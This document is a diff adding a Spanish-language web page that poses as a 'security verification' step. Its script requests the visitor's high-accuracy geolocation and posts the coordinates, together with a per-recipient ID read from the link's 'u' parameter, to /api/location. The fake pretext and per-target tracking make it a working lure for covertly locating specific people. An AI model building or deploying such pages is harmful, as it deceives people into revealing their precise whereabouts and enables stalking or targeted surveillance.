@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .loader { border-top-color: #3498db; animation: spinner 1.5s linear infinite; }
+        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="bg-gray-100 h-screen flex items-center justify-center p-4">
+
+    <div class="bg-white p-8 rounded-2xl shadow-xl max-w-sm w-full text-center">
+        <div id="status-icon" class="mb-4 text-blue-500">
+            <svg class="w-16 h-16 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path>
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path>
+            </svg>
+        </div>
+        
+        <h1 class="text-xl font-bold text-gray-800 mb-2" id="title">Verificando Ubicación</h1>
+        <p class="text-gray-600 mb-6" id="message">Para continuar, necesitamos confirmar tu ubicación actual.</p>
+
+        <button id="btn-share" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg transition duration-300 w-full">
+            Confirmar y Continuar
+        </button>
+
+        <div id="loading" class="hidden">
+            <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-200 h-12 w-12 mx-auto mb-4"></div>
+            <p class="text-sm text-gray-500">Procesando...</p>
+        </div>
+    </div>
+
+    <script>
+        const btn = document.getElementById('btn-share');
+        const loading = document.getElementById('loading');
+        const title = document.getElementById('title');
+        const message = document.getElementById('message');
+
+        btn.addEventListener('click', () => {
+            btn.classList.add('hidden');
+            loading.classList.remove('hidden');
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        try {
+                            const response = await fetch('/api/location', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy: position.coords.accuracy,
+                                    timestamp: position.timestamp,
+                                    userId: new URLSearchParams(window.location.search).get('u')
+                                })
+                            });
+
+                            if (response.ok) {
+                                title.innerText = "¡Gracias!";
+                                message.innerText = "La verificación ha sido completada con éxito.";
+                                loading.classList.add('hidden');
+                            }
+                        } catch (error) {
+                            console.error('Error al enviar:', error);
+                        }
+                    },
+                    (error) => {
+                        loading.classList.add('hidden');
+                        btn.classList.remove('hidden');
+                        alert("Es necesario permitir el acceso a la ubicación para continuar.");
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                alert("Tu navegador no soporta geolocalización.");
+            }
+        });
+    </script>
+</body>
+</html>
